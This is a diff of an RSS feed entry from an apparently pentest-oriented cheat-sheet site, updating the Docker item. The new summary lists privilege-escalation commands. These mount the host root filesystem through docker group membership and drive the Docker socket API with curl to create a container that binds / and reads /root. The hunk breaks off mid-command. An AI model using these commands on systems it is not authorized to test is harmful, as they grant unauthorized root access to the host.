@@ -12,7 +12,7 @@
       <link>https://tldrbins.github.io/docker/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>https://tldrbins.github.io/docker/</guid>
-      <description> Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root </description>
+      <description>Privesc Abuse docker group # List images docker images # Mount host root filesystem docker run -v /:/mnt -it image_name bash # Check ls /mnt/root Docker API # Show running containers curl -s --unix-socket /var/run/docker.sock http://localhost/images/json # Create container curl -s -X POST -H &amp;#39;Content-Type: application/json&amp;#39; --data-binary &amp;#39;{&amp;#34;Image&amp;#34;: &amp;#34;&amp;lt;image_name&amp;gt;:latest&amp;#34;,&amp;#34;HostConfig&amp;#34;: {&amp;#34;Binds&amp;#34;: [&amp;#34;/:/r&amp;#34;]}, &amp;#34;Cmd&amp;#34;: [&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;ls -la /r/root/&amp;#34;], &amp;#34;Tty&amp;#34;: true}&amp;#39; --unix-socket /var/run/docker.sock http://localhost/containers/create # Start container curl -s -X POST -H &amp;#39;Content-Type: application/json&amp;#39; --unix-socket /var/run/docker.</description>
     </item>
     <item>
       <title>Docker Registry</title>
